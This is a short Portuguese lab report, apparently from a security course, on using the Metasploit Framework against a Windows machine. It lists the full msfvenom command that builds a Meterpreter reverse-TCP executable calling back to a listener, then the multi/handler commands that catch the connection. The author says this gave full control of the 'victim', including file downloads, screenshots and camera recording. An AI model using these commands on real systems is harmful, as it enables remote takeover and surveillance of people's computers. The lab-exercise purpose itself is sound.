## Metasploit Framework

Para a realização da atividade foi necessário gerar um payload para que o ataque fosse possível.

- ```msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=192.168.1.10 LPORT=4444 -o payload```

Setado o payload, foi nencessário configurar o msf console para ficar aguardando a conexão, para isso foi executado os comandos abaixo:

- ```msfconsole```
- ```use multi/handler```
- ```set PAYLOAD windows/meterpreter/reverse_tcp```
- ```set LPORT 4444```
- ```set LHOST 192.168.1.10```
- ```exploit```

Depois, só foi necessário executar o payload em um sistema windows e esperar a conexão ser estabelecida.

Depois disso foi possível ter acesso total ao computador da vítima, onde foi possível baixar alguns arquivos do computador, tirar screenshots, gravar a camera, dentre outras possibilidades.

![](images/2.png)

No geral, a execução da atividade foi tranquila, não tive nenhum problema em sua execução.

